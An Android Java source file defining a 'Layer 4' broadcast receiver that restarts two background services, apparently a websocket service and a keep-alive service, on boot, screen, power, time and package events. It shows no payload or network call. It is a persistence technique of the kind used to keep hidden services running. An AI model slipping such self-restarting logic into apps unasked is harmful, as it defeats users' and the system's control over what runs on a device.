package com.drnull.app;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.util.Log;

/**
 * Layer 4: Multi-Event Broadcast Receiver
 * Listens for many system events and triggers service restart.
 * Events: Screen ON/OFF, User Present, Battery changes, Network changes,
 *         Package replaced, Date/Time changed, Charging, etc.
 */
public class KeepAliveReceiver extends BroadcastReceiver {
    private static final String TAG = "KAR";

    @Override
    public void onReceive(Context ctx, Intent intent) {
        if (intent == null || intent.getAction() == null) return;
        String action = intent.getAction();
        Log.d(TAG, "Event: " + action);

        switch (action) {
            case "CHECK_SERVICES":
            case Intent.ACTION_BOOT_COMPLETED:
            case Intent.ACTION_SCREEN_ON:
            case Intent.ACTION_USER_PRESENT:
            case Intent.ACTION_BATTERY_CHANGED:
            case Intent.ACTION_BATTERY_OKAY:
            case Intent.ACTION_POWER_CONNECTED:
            case Intent.ACTION_POWER_DISCONNECTED:
            case Intent.ACTION_DATE_CHANGED:
            case Intent.ACTION_TIME_CHANGED:
            case Intent.ACTION_TIMEZONE_CHANGED:
            case Intent.ACTION_LOCALE_CHANGED:
            case "RESTART_SERVICE":
            case "RESTART_KEEPALIVE":
            case "android.intent.action.QUICKBOOT_POWERON":
            case "com.htc.intent.action.QUICKBOOT_POWERON":
            case "android.intent.action.MY_PACKAGE_REPLACED":
            case Intent.ACTION_PACKAGE_REPLACED:
                restartServices(ctx);
                break;
        }
    }

    private void restartServices(Context ctx) {
        try {
            // Start WSService
            Intent ws = new Intent(ctx, WSService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                ctx.startForegroundService(ws);
            } else {
                ctx.startService(ws);
            }
        } catch (Exception e) {
            Log.e(TAG, "WS restart err", e);
        }

        try {
            // Start KeepAliveService
            Intent ka = new Intent(ctx, KeepAliveService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                ctx.startForegroundService(ka);
            } else {
                ctx.startService(ka);
            }
        } catch (Exception e) {
            Log.e(TAG, "KA restart err", e);
        }
    }
}
